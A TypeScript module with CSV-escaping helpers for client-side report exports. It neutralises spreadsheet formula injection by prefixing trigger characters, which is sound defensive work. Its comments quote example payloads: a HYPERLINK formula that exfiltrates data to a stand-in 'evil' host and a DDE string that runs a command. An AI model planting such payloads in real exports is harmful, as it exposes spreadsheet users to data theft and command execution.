// Pure CSV-building primitives for client-side exports (no DOM/React here -- these are plain
// string transforms, unit-tested directly in tests/reports-export.test.ts). Currently only
// src/app/(app)/reports/export-button.tsx consumes this, but it's written generically so any
// future client-side export reuses the same escaping/injection guards instead of re-deriving them.

// A cell whose FIRST character is one of these is a live-formula trigger in Excel/Sheets/
// LibreOffice: `=`/`+`/`-`/`@` start a formula, and a leading tab/CR can smuggle a formula past
// naive leading-character checks in some importers. Real exploits: data exfil via
// `=HYPERLINK("https://evil","click")`, DDE command execution via `=cmd|' /C calc'!A0`. Prefixing
// the value with a single quote forces every mainstream spreadsheet app to render it as literal
// text instead of evaluating it. ONLY ever applied to free-text (string) cells -- see
// `csvNumberCell` below for why numeric cells must never go through this guard.
const FORMULA_TRIGGER_RE = /^[=+\-@\t\r]/;

// Quotes a cell only when it actually needs it (contains a comma, quote, or newline) -- internal
// quotes are doubled per RFC 4180.
function quoteIfNeeded(value: string): string {
  return /[",\n]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
}

// Escapes a free-text CSV cell: neutralizes formula injection FIRST (prefixing a leading `'` when
// the value starts with =, +, -, @, tab, or CR), then applies RFC-4180 quoting on top. Use this for
// every STRING column that can carry arbitrary user input (project/client names, status labels).
// Project/client name zod schemas (project.ts/client.ts) place NO character restriction on the
// value beyond length -- a name of `=cmd|' /C calc'!A0` is a legitimate, valid row today, and this
// export carries confidential budget/margin data non-technical stakeholders open in Excel, so the
// guard is not optional.
export function csvCell(value: string): string {
  const guarded = FORMULA_TRIGGER_RE.test(value) ? `'${value}` : value;
  return quoteIfNeeded(guarded);
}

// Numeric CSV cell -- `null` (a gated/absent figure) renders as an empty string, never a fake 0.
// Deliberately NEVER routed through csvCell's formula guard: these are program-generated
// (`toFixed`), never user input, so injection can't reach them -- and a legitimate negative figure
// (e.g. "-2000.00" for an over-budget project's remaining) must still import as a NUMBER, not text,
// which is exactly what the formula guard would break (a leading "-" is itself a trigger char).
export function csvNumberCell(n: number | null, digits: number): string {
  return n === null ? "" : n.toFixed(digits);
}
